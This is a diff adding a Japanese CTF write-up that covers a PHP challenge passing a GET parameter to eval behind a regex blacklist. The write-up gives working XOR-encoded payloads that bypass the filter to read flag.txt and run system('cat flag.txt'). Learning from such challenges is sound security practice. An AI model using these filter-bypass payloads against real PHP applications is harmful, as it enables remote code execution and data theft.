@@ -44,7 +44,8 @@
 [Sanity Check Round 44](#sanity-check-round-44)  
 [kaiser](#kaiser)  
 [Sleepy](#sleepy)  
-[More SQLi](#more-sqli)
+[More SQLi](#more-sqli)  
+[Filters](#filters)
 
 # 解いた問題
 
@@ -603,3 +604,59 @@ SQL query: SELECT id FROM users WHERE password = 'a' AND username = 'a'
 - sql インジェクションでテーブルの情報を取得できる
 - 列の数が合わなかったら NULL で埋めれば良い
 - https://blog.hamayanhamayan.com/entry/2021/12/05/115923 このサイトに sql インジェクションの例がいっぱい載ってて良い
+
+## Filters
+
+## 解き方
+
+画面にアクセスすると次のことが画面に表示される。
+
+```
+<?php
+highlight_file(__FILE__);
+$command = $_GET['command'] ?? '';
+
+if($command === '') {
+    die("Please provide a command\n");
+}
+
+function filter($command) {
+    if(preg_match('/(`|\.|\$|\/|a|c|s|require|include)/i', $command)) {
+        return false;
+    }
+    return true;
+}
+
+if(filter($command)) {
+    eval($command);
+    echo "Command executed";
+} else {
+    echo "Restricted characters have been used";
+}
+echo "\n";
+?>
+Please provide a command
+```
+
+このコードを chatgpt に入れると url パラメーターの command を eval で実行してることがわかる。eval を実行する前に filter で'/(`|\.|\$|\/|a|c|s|require|include)/i' が command に含まれていないか確認し、含まれている場合は command が実行されない。今回は使えない文字を生成するために文字同士の xor を利用した。
+
+### ダメだったパターン
+
+- system('cat flag.txt');を示す'101000MM100M0100L000MMM' ^ 'BIBDU]ejRQDmV]QWbDHDjdv';を command として送信
+- system('ls');を表す'101000MM10MMM' ^ 'BIBDU]ej]Bjdv'の送信
+
+ダメだった理由  
+'101000MM10MMM' ^ 'BIBDU]ej]Bjdv'が実行されて system('ls');ていう文字列自体は生成されるものの文字列のため実行されない。再起的に生成された文字をコマンドとして扱うわけじゃない。
+
+### 良いパターン
+
+- print_r(file('flag.txt'));を表す print_r(file('0100L000' ^ 'V]QWbDHD'));を送信。文字の xor が先実行されそのあと file,print_r コマンドが実行される。再起的な構造になっていない。
+
+- print_r(('system')('cat flag.txt')) を表す print_r(("111114"^"BHBETY")("111q1411w111"^"RPEQWXPVYEIE"))を送信。まず文字の xor が実行されて print_r(('system')('cat flag.txt'))形になる。このあと('system')('cat flag.txt')は system('cat flag.txt')として実行される（php の文法ぽい)
+
+## 学び
+
+- php インジェクションっていうものがあるらしい
+- php インジェクションで使える文字を制限されてたら文字列の xor とか色々なコマンド調べるのが良い
+- 文字列の xor で作られたものは文字列でコマンドとして実行されない
+- ('a' ^ 'b')('c' ^ 'd')みたいな形で('command')('引数')を作ればコマンド名も xor で作れる
